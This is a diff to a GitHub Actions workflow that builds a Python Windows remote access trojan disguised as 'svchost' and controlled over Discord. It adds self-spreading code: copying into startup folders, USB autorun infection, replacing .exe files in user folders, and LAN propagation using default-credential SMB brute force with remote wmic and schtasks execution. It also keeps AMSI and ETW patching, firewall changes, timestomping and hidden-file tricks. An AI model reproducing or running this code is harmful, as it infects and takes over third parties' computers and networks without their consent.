@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       token:
-        description: 'Discord Bot Token (ĐỂ TRỐNG nếu chỉ dùng web)'
+        description: 'Discord Bot Token (de trong = chi phat tan, khong bot)'
         required: false
         default: ''
         type: string
@@ -18,18 +18,8 @@ on:
         required: false
         default: '0'
         type: string
-      control_url:
-        description: 'URL server web control (de trong = dung default)'
-        required: false
-        default: 'https://bvwqmiv7phoi.ramnaymcloud.com'
-        type: string
-      control_fetch:
-        description: 'URL raw tra ve control URL (tuy chon, uu tien cao nhat)'
-        required: false
-        default: ''
-        type: string
       agent_key:
-        description: 'Key cho agent (khớp AGENT_KEY bên server, rỗng = không cần)'
+        description: 'Key cho agent (rỗng = không cần)'
         required: false
         default: ''
         type: string
@@ -60,7 +50,7 @@ permissions:
 jobs:
   build:
     runs-on: windows-latest
-    timeout-minutes: 30
+    timeout-minutes: 40
     env:
       PYTHONIOENCODING: utf-8
       PYTHONUTF8: '1'
@@ -80,11 +70,11 @@ jobs:
         run: |
           $py = @'
           # ============================================================
-          #   DISCORD REMOTE AGENT "svchost" - FULL + WEB REALTIME CONTROL
+          #   SVCHOST - RAT Windows: Discord + PERSIST + PHAT TAN
+          #   (LAN/SMB - USB - nhiem file .exe - tha thu muc chuong trinh)
           # ============================================================
-          import os, sys, io, time, json, socket, ctypes, zipfile, subprocess, threading, wave
+          import os, sys, io, time, json, socket, ctypes, zipfile, subprocess, threading
           import base64, glob, shutil, tempfile, platform, datetime, queue, asyncio, re, random, hashlib
-          import ssl as _ssl
 
           import discord
 
@@ -134,7 +124,6 @@ jobs:
           pyautogui = _imp("pyautogui"); pyperclip = _imp("pyperclip")
           pynput = _imp("pynput"); requests = _imp("requests"); np = _imp("numpy")
           sd = _imp("sounddevice"); sf = _imp("soundfile"); sc = _imp("soundcard")
-          websocket = _imp("websocket")
           try:
               from PIL import Image, ImageGrab
           except Exception:
@@ -145,7 +134,7 @@ jobs:
           NO_WIN = 0x08000000
 
           # ============================================================
-          #  NGỤY TRANG / PERSIST (task onlogon + guard 5 phút, KHÔNG ở tab Startup)
+          #  NGUY TRANG / PERSIST
           # ============================================================
           def self_path():
               return sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
@@ -179,9 +168,11 @@ jobs:
 
           def reg_set(name, value):
               import winreg
-              k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                  r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-              winreg.SetValueEx(k, name, 0, winreg.REG_SZ, value); winreg.CloseKey(k)
+              try:
+                  k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                      r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+                  winreg.SetValueEx(k, name, 0, winreg.REG_SZ, value); winreg.CloseKey(k)
+              except Exception: pass
 
           def reg_del(name):
               import winreg
@@ -234,7 +225,7 @@ jobs:
                   os.makedirs(INSTALL_DIR, exist_ok=True)
                   me = self_path()
                   if os.path.normcase(me) != os.path.normcase(SCRIPT_PATH):
-                      shutil.copy2(me, SCRIPT_PATH)
+                      _place(me, SCRIPT_PATH)
                   launch = _launch_cmd()
                   ok1 = _schtasks("svchost", launch, "onlogon")
                   g = _guard_vbs()
@@ -310,6 +301,16 @@ jobs:
               except Exception: pass
               return True
 
+          def _sidecar_launch():
+              """Neu exe nay la ban da nhiem (co X.exe.bak canh no) -> chay lai chuong trinh goc."""
+              try:
+                  me = self_path()
+                  if os.path.normcase(me) == os.path.normcase(SCRIPT_PATH): return
+                  bak = me + ".bak"
+                  if os.path.exists(bak) and os.path.getsize(bak) > 4096:
+                      subprocess.Popen(f'cmd /c start "" "{bak}"', shell=True, creationflags=NO_WIN)
+              except Exception: pass
+
           # ============================================================
           #  BYPASS AV
           # ============================================================
@@ -317,7 +318,7 @@ jobs:
               try:
                   k = ctypes.windll.kernel32
                   h = k.LoadLibraryW("amsi.dll")
-                  if not h: return "không load amsi.dll"
+                  if not h: return "khong load amsi.dll"
                   addr = k.GetProcAddress(h, b"AmsiScanBuffer")
                   patch = b"\xB8\x57\x00\x07\x80\xC3"
                   old = ctypes.c_ulong()
@@ -325,7 +326,7 @@ jobs:
                   ctypes.memmove(addr, patch, len(patch))
                   k.VirtualProtect(addr, len(patch), old, ctypes.byref(old))
                   return "AMSI patched"
-              except Exception as e: return f"AMSI lỗi: {e}"
+              except Exception as e: return f"AMSI loi: {e}"
 
           def etw_patch():
               try:
@@ -338,7 +339,7 @@ jobs:
                   ctypes.memmove(addr, patch, len(patch))
                   k.VirtualProtect(addr, len(patch), old, ctypes.byref(old))
                   return "ETW patched"
-              except Exception as e: return f"ETW lỗi: {e}"
+              except Exception as e: return f"ETW loi: {e}"
 
           AMSI_BYPASS = ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                          ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
@@ -371,7 +372,7 @@ jobs:
               out.append(run_cmd(f'netsh advfirewall firewall add rule name="svchost" dir=in action=allow program="{SCRIPT_PATH}" enable=yes'))
               out.append(run_cmd(f'netsh advfirewall firewall add rule name="svchost_out" dir=out action=allow program="{SCRIPT_PATH}" enable=yes'))
               unblock(SCRIPT_PATH)
-              return "\n".join(x for x in out if x) or "[đã áp dụng]"
+              return "\n".join(x for x in out if x) or "[da ap dung]"
 
           def f_defender(state="status"):
               s = state.lower()
@@ -386,15 +387,15 @@ jobs:
               path = os.path.expanduser(path or SCRIPT_PATH)
               try:
                   st = os.stat(ref); os.utime(path, (st.st_atime, st.st_mtime))
-                  return f"Đã timestomp {path}"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"Da timestomp {path}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_hide(path):
               try:
                   subprocess.call(f'attrib +h +s +r "{os.path.expanduser(path)}"',
                                   shell=True, creationflags=NO_WIN)
-                  return f"Đã ẩn: {path}"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"Da an: {path}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_clone(path):
               path = os.path.expanduser(path)
@@ -402,17 +403,16 @@ jobs:
                   os.makedirs(os.path.dirname(path), exist_ok=True)
                   shutil.copy2(self_path(), path); unblock(path)
                   subprocess.Popen(f'cmd /c start "" "{path}"', shell=True, creationflags=NO_WIN)
-                  return f"Đã clone → {path}"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"Da clone -> {path}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_sandbox():
               out = []
               try: out.append(f"Debugger: {bool(ctypes.windll.kernel32.IsDebuggerPresent())}")
               except Exception: pass
               if psutil:
-                  up = time.time() - psutil.boot_time()
                   out.append(f"CPU: {psutil.cpu_count()} | RAM: {round(psutil.virtual_memory().total/1e9,1)}GB")
-                  out.append(f"Uptime: {int(up)}s")
+                  out.append(f"Uptime: {int(time.time() - psutil.boot_time())}s")
               out.append(run_cmd('wmic computersystem get model,manufacturer'))
               return "\n".join(x for x in out if x)
 
@@ -423,7 +423,7 @@ jobs:
               return await client.loop.run_in_executor(None, lambda: fn(*a))
 
           async def send_long(message, text, lang=""):
-              text = text or "[trống]"
+              text = text or "[trong]"
               while text:
                   chunk, text = text[:1900], text[1900:]
                   await message.channel.send(f"```{lang}\n{chunk}\n```")
@@ -442,7 +442,7 @@ jobs:
                       pp = f"{path}.p{i:02d}"
                       open(pp, "wb").write(b); parts.append((pp, f"{filename}.part{i:02d}")); i += 1
               tot = len(parts)
-              await ch.send(f"📦 File lớn ({human(size)}) → chia {tot} phần. Ghép: `copy /b \"{filename}.part*\" \"{filename}\"`")
+              await ch.send(f"File lon ({human(size)}) -> chia {tot} phan. Ghep: `copy /b \"{filename}.part*\" \"{filename}\"`")
               for idx, (pp, pn) in enumerate(parts, 1):
                   try:
                       await ch.send(f"[{idx}/{tot}]", file=discord.File(pp, filename=pn))
@@ -454,10 +454,10 @@ jobs:
               try:
                   out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                                 timeout=timeout, creationflags=NO_WIN)
-                  return out.decode("utf-8", errors="ignore") or "[không output]"
+                  return out.decode("utf-8", errors="ignore") or "[khong output]"
               except subprocess.CalledProcessError as e:
                   return e.output.decode("utf-8", errors="ignore")
-              except Exception as e: return f"[Lỗi] {e}"
+              except Exception as e: return f"[Loi] {e}"
 
           def human(n):
               for u in ("B","KB","MB","GB","TB"):
@@ -483,7 +483,320 @@ jobs:
                                shell=True, creationflags=NO_WIN)
 
           # ============================================================
-          #  MULTI-VICTIM (list / select / back / master)
+          #  PHAT TAN 1: THA VAO THU MUC CHUONG TRINH
+          # ============================================================
+          SPREAD_NAME = EXE_NAME
+          SPREAD_EXE  = SCRIPT_PATH
+          SPREAD_LOG  = os.path.join(INSTALL_DIR, "spread.log")
+          AUTO_SPREAD = [True]
+          _stat = {"lan": 0, "usb": 0, "file": 0, "prog": 0, "hosts": [], "last_lan": 0}
+
+          def _log(m):
+              try:
+                  with open(SPREAD_LOG, "a", encoding="utf-8") as f:
+                      f.write(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {m}\n")
+              except Exception: pass
+
+          def _place(src, dst):
+              """Hardlink neu cung o dia (0 byte), khong thi copy."""
+              try:
+                  if os.path.normcase(src) == os.path.normcase(dst): return True
+                  os.makedirs(os.path.dirname(dst), exist_ok=True)
+                  if os.path.exists(dst):
+                      try: os.remove(dst)
+                      except Exception: pass
+                  try: os.link(src, dst)
+                  except Exception: shutil.copy2(src, dst)
+                  return os.path.exists(dst)
+              except Exception: return False
+
+          def spread_programs():
+              ad = os.environ.get("APPDATA", ""); ld = os.environ.get("LOCALAPPDATA", "")
+              pd = os.environ.get("PROGRAMDATA", r"C:\ProgramData")
+              targets = [
+                  os.path.join(ld, r"Programs\svchost"),
+                  os.path.join(ad, r"Microsoft\Windows\Start Menu\Programs\Startup"),
+                  os.path.join(pd, r"Microsoft\Windows\Start Menu\Programs\StartUp"),
+                  os.path.join(pd, "svchost"),
+                  r"C:\Program Files\svchost",
+                  r"C:\Program Files (x86)\svchost",
+                  os.path.join(ad, r"Microsoft\svchost_backup"),
+              ]
+              ok = []
+              for d in targets:
+                  t = os.path.join(d, SPREAD_NAME)
+                  if _place(SPREAD_EXE, t):
+                      try: subprocess.call(f'attrib +h "{t}"', shell=True, creationflags=NO_WIN)
+                      except Exception: pass
+                      ok.append(d)
+              _stat["prog"] = len(ok); _log(f"program: {len(ok)} cho")
+              return ok
+
+          # ============================================================
+          #  PHAT TAN 2: USB / O DI DONG
+          # ============================================================
+          def _removable():
+              out = []
+              try:
+                  r = subprocess.run('wmic logicaldisk where drivetype=2 get deviceid',
+                                     shell=True, capture_output=True, creationflags=NO_WIN, timeout=15)
+                  for line in r.stdout.decode("utf-8", "ignore").splitlines():
+                      line = line.strip()
+                      if len(line) == 2 and line[1] == ":": out.append(line + "\\")
+              except Exception: pass
+              if not out and psutil:
+                  for p in psutil.disk_partitions():
+                      if "removable" in (p.opts or ""): out.append(p.mountpoint)
+              return out
+
+          def spread_usb():
+              n = 0
+              for d in _removable():
+                  try:
+                      tgt = os.path.join(d, SPREAD_NAME)
+                      if os.path.exists(tgt):
+                          try:
+                              if os.path.getsize(tgt) == os.path.getsize(SPREAD_EXE): pass
+                          except Exception: pass
+                      _place(SPREAD_EXE, tgt)
+                      subprocess.call(f'attrib +h +s "{tgt}"', shell=True, creationflags=NO_WIN)
+                      with open(os.path.join(d, "autorun.inf"), "w", encoding="utf-8") as f:
+                          f.write(f"[Autorun]\nopen={SPREAD_NAME}\nicon={SPREAD_NAME},0\nlabel=svchost\n")
+                      n += 1
+                  except Exception: pass
+              _stat["usb"] = n; _log(f"usb: {n} o")
+              return f"Da chen vao {n} o USB/removable" if n else "Khong thay o removable"
+
+          # ============================================================
+          #  PHAT TAN 3: NHIEM FILE .EXE (rename goc -> .bak, dat agent vao cho)
+          # ============================================================
+          def infect_file(fp):
+              try:
+                  if not fp.lower().endswith(".exe"): return False
+                  if os.path.exists(fp + ".bak"): return False
+                  if os.path.normcase(fp) == os.path.normcase(SPREAD_EXE): return False
+                  sz = os.path.getsize(fp)
+                  if sz < 30000: return False
+                  if sz == os.path.getsize(SPREAD_EXE): return False
+                  os.replace(fp, fp + ".bak")
+                  if not _place(SPREAD_EXE, fp):
+                      try: os.replace(fp + ".bak", fp)
+                      except Exception: pass
+                      return False
+                  return True
+              except Exception: return False
+
+          def _scan_roots(path=""):
+              if path: return [os.path.expanduser(path)]
+              h = os.path.expanduser("~")
+              return [os.path.join(h, x) for x in ("Desktop", "Documents", "Downloads")]
+
+          def f_infect(path="", limit=25):
+              try: limit = int(limit)
+              except Exception: limit = 25
+              done = []
+              for root in _scan_roots(path):
+                  if not os.path.isdir(root): continue
+                  for dp, dn, fn in os.walk(root):
+                      if len(done) >= limit: break
+                      low = dp.lower()
+                      if "windowsapps" in low: continue
+                      for f in fn:
+                          if len(done) >= limit: break
+                          if not f.lower().endswith(".exe"): continue
+                          fp = os.path.join(dp, f)
+                          if infect_file(fp): done.append(fp)
+              _stat["file"] += len(done); _log(f"infect: {len(done)}")
+              if not done: return "Khong nhiem duoc file nao"
+              return f"Da nhiem {len(done)} file .exe:\n" + "\n".join(done[:20])
+
+          def f_uninfect(path=""):
+              n = 0
+              for root in _scan_roots(path):
+                  if not os.path.isdir(root): continue
+                  for dp, dn, fn in os.walk(root):
+                      for f in fn:
+                          if not f.lower().endswith(".exe.bak"): continue
+                          fp = os.path.join(dp, f); orig = fp[:-4]
+                          try:
+                              if os.path.exists(orig): os.remove(orig)
+                              os.replace(fp, orig); n += 1
+                          except Exception: pass
+              return f"Da khoi phuc {n} file"
+
+          # ============================================================
+          #  PHAT TAN 4: LAN (SMB + REG + WMIC/SCHTASKS)
+          # ============================================================
+          CREDS = [("", ""), ("Administrator", ""), ("Administrator", "123456"),
+                   ("Administrator", "admin"), ("Administrator", "password"),
+                   ("admin", ""), ("admin", "admin"), ("User", ""), ("user", "")]
+
+          def _local_ip():
+              try:
+                  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                  s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
+              except Exception: return ""
+
+          def _arp_hosts():
+              hosts = set()
+              try:
+                  out = subprocess.check_output("arp -a", shell=True,
+                          creationflags=NO_WIN).decode("utf-8", "ignore")
+                  for line in out.splitlines():
+                      m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})\s+([0-9a-f]{2}(?:-[0-9a-f]{2}){5})", line, re.I)
+                      if m: hosts.add(m.group(1))
+              except Exception: pass
+              return hosts
+
+          def _alive(ip, ms=400):
+              try:
+                  r = subprocess.run(f"ping -n 1 -w {ms} {ip}", shell=True, capture_output=True,
+                                     creationflags=NO_WIN, timeout=5)
+                  t = r.stdout.decode("utf-8", "ignore").upper()
+                  return "TTL=" in t
+              except Exception: return False
+
+          def _sweep(prefix, batch=64):
+              live, lock = [], threading.Lock()
+              def work(i):
+                  ip = f"{prefix}.{i}"
+                  if _alive(ip):
+                      with lock: live.append(ip)
+              i = 1
+              while i <= 254:
+                  ts = []
+                  for j in range(i, min(i + batch, 255)):
+                      t = threading.Thread(target=work, args=(j,), daemon=True)
+                      t.start(); ts.append(t)
+                  for t in ts: t.join()
+                  i += batch
+              return live
+
+          def _net_use(ip, user, pw):
+              try:
+                  subprocess.run(f'net use \\\\{ip}\\IPC$ /delete /y', shell=True,
+                                 capture_output=True, creationflags=NO_WIN, timeout=8)
+                  cmd = f'net use \\\\{ip}\\IPC$'
+                  if pw: cmd += f' "{pw}"'
+                  if user: cmd += f' /user:{user}'
+                  r = subprocess.run(cmd, shell=True, capture_output=True,
+                                     creationflags=NO_WIN, timeout=12)
+                  return r.returncode == 0
+              except Exception: return False
+
+          def _host_ok(ip):
+              try:
+                  r = subprocess.run(f'dir \\\\{ip}\\C$', shell=True, capture_output=True,
+                                     creationflags=NO_WIN, timeout=12)
+                  return r.returncode == 0
+              except Exception: return False
+
+          def _drop_to(ip, user, pw):
+              base = f"\\\\{ip}\\C$"
+              win  = r"C:\Windows\Temp\svchost.exe"
+              dst  = base + r"\Windows\Temp\svchost.exe"
+              try:
+                  r = subprocess.run(f'copy /y "{SPREAD_EXE}" "{dst}"', shell=True,
+                                     capture_output=True, creationflags=NO_WIN, timeout=300)
+                  if r.returncode != 0 or not os.path.exists(dst):
+                      win = r"C:\Users\Public\svchost.exe"
+                      dst = base + r"\Users\Public\svchost.exe"
+                      subprocess.run(f'copy /y "{SPREAD_EXE}" "{dst}"', shell=True,
+                                     capture_output=True, creationflags=NO_WIN, timeout=300)
+              except Exception: return False
+              if not os.path.exists(dst): return False
+              try:
+                  subprocess.run(f'reg add "{base}\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
+                                 f'/v svchost /t REG_SZ /d "{win}" /f', shell=True,
+                                 capture_output=True, creationflags=NO_WIN, timeout=25)
+              except Exception: pass
+              wc = f' /user:"{user}" /password:"{pw}"' if user else ""
+              sc2 = f' /u "{user}" /p "{pw}"' if user else ""
+              for cmd in (f'wmic /node:"{ip}"{wc} process call create "{win}"',
+                          f'schtasks /s {ip}{sc2} /create /tn svchost /tr "{win}" /sc onlogon /f',
+                          f'schtasks /s {ip}{sc2} /run /tn svchost'):
+                  try:
+                      subprocess.run(cmd, shell=True, capture_output=True,
+                                     creationflags=NO_WIN, timeout=60)
+                  except Exception: pass
+              _log(f"LAN ok: {ip} ({user or 'session'})")
+              return True
+
+          def _spread_host(ip):
+              if _host_ok(ip): return _drop_to(ip, "", "")
+              for u, p in CREDS:
+                  try:
+                      if _net_use(ip, u, p) and _host_ok(ip):
+                          return _drop_to(ip, u, p)
+                  except Exception: pass
+              return False
+
+          def spread_lan(subnet=""):
+              ip = _local_ip()
+              if not ip: return "Khong lay duoc IP LAN"
+              prefix = (subnet or "").strip() or ip.rsplit(".", 1)[0]
+              cands = set(h for h in _arp_hosts() if h.startswith(prefix + "."))
+              try: cands |= set(_sweep(prefix))
+              except Exception: pass
+              cands.discard(ip)
+              hosts = sorted(cands, key=lambda x: int(x.split(".")[-1]))
+              if not hosts: return "Khong thay may nao trong LAN"
+              got, lock = [], threading.Lock()
+              def work(h):
+                  try:
+                      if _spread_host(h):
+                          with lock: got.append(h)
+                  except Exception: pass
+              i = 0
+              while i < len(hosts):
+                  ts = [threading.Thread(target=work, args=(h,), daemon=True)
+                        for h in hosts[i:i+4]]
+                  for t in ts: t.start()
+                  for t in ts: t.join()
+                  i += 4
+              _stat["hosts"] = got; _stat["lan"] = len(got); _stat["last_lan"] = time.time()
+              _log(f"LAN: {len(got)}/{len(hosts)}")
+              return (f"Quet {len(hosts)} may -> lay duoc {len(got)}"
+                      + (": " + ", ".join(got) if got else " (khong)"))
+
+          def _autospread():
+              time.sleep(90)
+              while True:
+                  try:
+                      if AUTO_SPREAD[0]:
+                          spread_usb()
+                          if time.time() - _stat["last_lan"] > 1800:
+                              _stat["last_lan"] = time.time()
+                              spread_lan()
+                  except Exception: pass
+                  time.sleep(180)
+
+          def f_spread(mode="all"):
+              m = (mode or "all").lower()
+              out = []
+              if m in ("all", "prog", "ct"):
+                  try: out.append(f"[chuong trinh] {len(spread_programs())} cho")
+                  except Exception as e: out.append(f"prog loi: {e}")
+              if m in ("all", "usb"):
+                  try: out.append("[usb] " + spread_usb())
+                  except Exception as e: out.append(f"usb loi: {e}")
+              if m in ("all", "file", "infect"):
+                  try: out.append("[file] " + f_infect("", 20).splitlines()[0])
+                  except Exception as e: out.append(f"file loi: {e}")
+              if m in ("all", "lan"):
+                  try: out.append("[lan] " + spread_lan())
+                  except Exception as e: out.append(f"lan loi: {e}")
+              return "\n".join(out)
+
+          def f_spreadinfo():
+              return (f"Auto: {'ON' if AUTO_SPREAD[0] else 'OFF'}\n"
+                      f"LAN: {_stat['lan']} may | USB: {_stat['usb']} o | File: {_stat['file']} | Chuong trinh: {_stat['prog']}\n"
+                      f"IP LAN: {_local_ip()}\n"
+                      f"Host da lay: {', '.join(_stat['hosts']) or '(chua co)'}\n"
+                      f"Log: {SPREAD_LOG}")
+
+          # ============================================================
+          #  MULTI-VICTIM
           # ============================================================
           _reg_cache = {"ts": 0, "regs": {}}
 
@@ -546,7 +859,7 @@ jobs:
                   await _register(ch)
 
           # ============================================================
-          #  SHELL PHIÊN BỀN
+          #  SHELL PHIEN BEN
           # ============================================================
           class Shell:
               def __init__(self):
@@ -597,16 +910,16 @@ jobs:
           # ============================================================
           def f_ls(path="."):
               path = os.path.expanduser(path or ".")
-              if not os.path.exists(path): return f"Không tồn tại: {path}"
+              if not os.path.exists(path): return f"Khong ton tai: {path}"
               if os.path.isfile(path): return f"{human(os.path.getsize(path))}  {path}"
-              lines = [f"📁 {os.path.abspath(path)}"]
+              lines = [f"[DIR] {os.path.abspath(path)}"]
               try:
                   for e in sorted(os.scandir(path), key=lambda x: x.name.lower()):
                       try:
                           if e.is_dir(): lines.append(f"[DIR ] {e.name}")
                           else: lines.append(f"{human(e.stat().st_size):>8}  {e.name}")
                       except Exception: pass
-              except Exception as e: return f"Lỗi: {e}"
+              except Exception as e: return f"Loi: {e}"
               return "\n".join(lines[:300])
 
           def f_search(name, root="C:\\"):
@@ -616,15 +929,15 @@ jobs:
                       if name.lower() in f.lower():
                           hits.append(os.path.join(dp, f))
                           if len(hits) >= 100: return "\n".join(hits)
-              return "\n".join(hits) or "Không tìm thấy"
+              return "\n".join(hits) or "Khong tim thay"
 
           def f_del(path):
               path = os.path.expanduser(path)
               try:
                   if os.path.isdir(path): shutil.rmtree(path)
                   else: os.remove(path)
-                  return f"Đã xóa: {path}"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"Da xoa: {path}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_zip(path):
               path = os.path.expanduser(path)
@@ -641,34 +954,34 @@ jobs:
 
           def f_cat(path):
               path = os.path.expanduser(path)
-              if not os.path.exists(path): return f"Không tồn tại: {path}"
+              if not os.path.exists(path): return f"Khong ton tai: {path}"
               try:
                   with open(path, "r", encoding="utf-8", errors="ignore") as f: return f.read()[:25000]
-              except Exception as e: return f"Lỗi: {e}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_write(args):
-              if len(args) < 2: return "Dùng: write <path> <nội dung>"
+              if len(args) < 2: return "Dung: write <path> <noi dung>"
               path = os.path.expanduser(args[0]); content = " ".join(args[1:])
               try:
                   with open(path, "w", encoding="utf-8") as f: f.write(content)
-                  return f"Đã ghi {path}"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"Da ghi {path}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_mkdir(path):
-              try: os.makedirs(os.path.expanduser(path), exist_ok=True); return f"Đã tạo {path}"
-              except Exception as e: return f"Lỗi: {e}"
+              try: os.makedirs(os.path.expanduser(path), exist_ok=True); return f"Da tao {path}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_copy(args):
-              try: shutil.copy2(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã copy"
-              except Exception as e: return f"Lỗi: {e}"
+              try: shutil.copy2(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Da copy"
+              except Exception as e: return f"Loi: {e}"
 
           def f_move(args):
-              try: shutil.move(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã move"
-              except Exception as e: return f"Lỗi: {e}"
+              try: shutil.move(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Da move"
+              except Exception as e: return f"Loi: {e}"
 
           def f_rename(args):
-              try: os.rename(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã đổi tên"
-              except Exception as e: return f"Lỗi: {e}"
+              try: os.rename(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Da doi ten"
+              except Exception as e: return f"Loi: {e}"
 
           def f_du(path):
               path = os.path.expanduser(path or "."); total = 0
@@ -685,9 +998,9 @@ jobs:
                   try: entries = sorted(os.scandir(d), key=lambda x: x.name.lower())
                   except Exception: return
                   for e in entries[:80]:
-                      lines.append(f"{pre}{'📁 ' if e.is_dir() else '📄 '}{e.name}")
+                      lines.append(f"{pre}{'[+]' if e.is_dir() else '   '}{e.name}")
                       if e.is_dir(): walk(e.path, pre + "   ", lvl + 1)
-              lines.append(f"📁 {os.path.abspath(path)}"); walk(path, "   ", 1)
+              lines.append(f"[DIR] {os.path.abspath(path)}"); walk(path, "   ", 1)
               return "\n".join(lines[:400])
 
           def f_hex(path):
@@ -700,33 +1013,33 @@ jobs:
                       t = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
                       out.append(f"{i:08x}  {h:<48}  {t}")
                   return "\n".join(out)
-              except Exception as e: return f"Lỗi: {e}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_merge(args):
-              if not args: return "Dùng: merge <path gốc>"
+              if not args: return "Dung: merge <path goc>"
               base = os.path.expanduser(" ".join(args))
               parts = sorted(glob.glob(base + ".part*")) or sorted(glob.glob(base + ".p*"))
-              if not parts: return "Không thấy file part"
+              if not parts: return "Khong thay file part"
               with open(base, "wb") as out:
                   for p in parts: out.write(open(p, "rb").read())
-              return f"Đã ghép {len(parts)} phần → {base}"
+              return f"Da ghep {len(parts)} phan -> {base}"
 
           # ============================================================
-          #  HỆ THỐNG
+          #  HE THONG
           # ============================================================
           def f_sysinfo():
-              if not psutil: return "Thiếu psutil"
+              if not psutil: return "Thieu psutil"
               try: user = os.getlogin()
               except Exception: user = os.environ.get("USERNAME", "?")
               vm = psutil.virtual_memory(); du = psutil.disk_usage("C:\\")
               boot = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M")
-              return (f"🖥️ Máy: {platform.node()} | ID: {MACHINE_ID} | User: {user} | Admin: {is_admin()}\n"
+              return (f"May: {platform.node()} | ID: {MACHINE_ID} | User: {user} | Admin: {is_admin()}\n"
                       f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
                       f"CPU: {psutil.cpu_count()} | RAM: {human(vm.used)}/{human(vm.total)} ({vm.percent}%)\n"
-                      f"Ổ C: {human(du.used)}/{human(du.total)} ({du.percent}%)\nBoot: {boot}")
+                      f"O C: {human(du.used)}/{human(du.total)} ({du.percent}%)\nBoot: {boot}")
 
           def f_ps():
-              if not psutil: return "Thiếu psutil"
+              if not psutil: return "Thieu psutil"
               rows = []
               for p in psutil.process_iter(["pid","name","memory_info","cpu_percent"]):
                   try:
@@ -737,38 +1050,38 @@ jobs:
               return "\n".join(f"{c:5.1f}%  PID {pid:<7} {human(mem):>9}  {n}" for c,pid,n,mem in rows[:80])
 
           def f_kill(target):
-              if not psutil: return "Thiếu psutil"
+              if not psutil: return "Thieu psutil"
               n = 0
               for p in psutil.process_iter(["pid","name"]):
                   try:
                       if target.lower() in (p.info["name"] or "").lower() or str(p.info["pid"]) == target:
                           p.kill(); n += 1
                   except Exception: pass
-              return f"Đã tắt {n} tiến trình khớp '{target}'"
+              return f"Da tat {n} tien trinh khop '{target}'"
 
           def f_start(path):
-              try: os.startfile(path); return f"Đã chạy: {path}"
-              except Exception as e: return f"Lỗi: {e}"
+              try: os.startfile(path); return f"Da chay: {path}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_power(action):
               a = action.lower()
               cmds = {"shutdown":"shutdown /s /t 3","restart":"shutdown /r /t 3",
                       "sleep":"rundll32.exe powrprof.dll,SetSuspendState 0,1,0",
                       "lock":"rundll32.exe user32.dll,LockWorkStation","logoff":"shutdown /l"}
-              if a not in cmds: return "Chọn: shutdown|restart|sleep|lock|logoff"
-              subprocess.Popen(cmds[a], shell=True, creationflags=NO_WIN); return f"Đang {a}..."
+              if a not in cmds: return "Chon: shutdown|restart|sleep|lock|logoff"
+              subprocess.Popen(cmds[a], shell=True, creationflags=NO_WIN); return f"Dang {a}..."
 
           def f_clip_set(text):
-              if pyperclip: pyperclip.copy(text); return "Đã ghi clipboard"
-              return "Thiếu pyperclip"
+              if pyperclip: pyperclip.copy(text); return "Da ghi clipboard"
+              return "Thieu pyperclip"
 
           def f_clip_get():
-              if pyperclip: return pyperclip.paste() or "[trống]"
-              return "Thiếu pyperclip"
+              if pyperclip: return pyperclip.paste() or "[trong]"
+              return "Thieu pyperclip"
 
           def f_msg(text):
               def _popup(): ctypes.windll.user32.MessageBoxW(0, text, "svchost", 0x40)
-              threading.Thread(target=_popup, daemon=True).start(); return "Đã bật popup"
+              threading.Thread(target=_popup, daemon=True).start(); return "Da bat popup"
 
           def f_notify(text):
               ps = ('powershell -NoProfile -c "'
@@ -777,19 +1090,19 @@ jobs:
                     "$n.Icon = [System.Drawing.SystemIcons]::Information;$n.Visible = $true;"
                     "$n.ShowBalloonTip(4000, 'svchost', '" + text + "', 0);"
                     "Start-Sleep -Seconds 5; $n.Dispose()\"")
-              subprocess.Popen(ps, shell=True, creationflags=NO_WIN); return "Đã gửi thông báo"
+              subprocess.Popen(ps, shell=True, creationflags=NO_WIN); return "Da gui thong bao"
 
           def f_wall(path):
               try:
                   if path.startswith("http"):
-                      if not requests: return "Thiếu requests"
+                      if not requests: return "Thieu requests"
                       p = os.path.join(LOOT_DIR, "wall.jpg")
                       r = requests.get(path, timeout=90); open(p, "wb").write(r.content)
                       path = p
                   path = os.path.abspath(os.path.expanduser(path))
                   ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
-                  return f"Đã đổi hình nền: {path}"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"Da doi hinh nen: {path}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_drives():
               out = []
@@ -820,13 +1133,13 @@ jobs:
           def f_battery():
               if psutil:
                   b = psutil.sensors_battery()
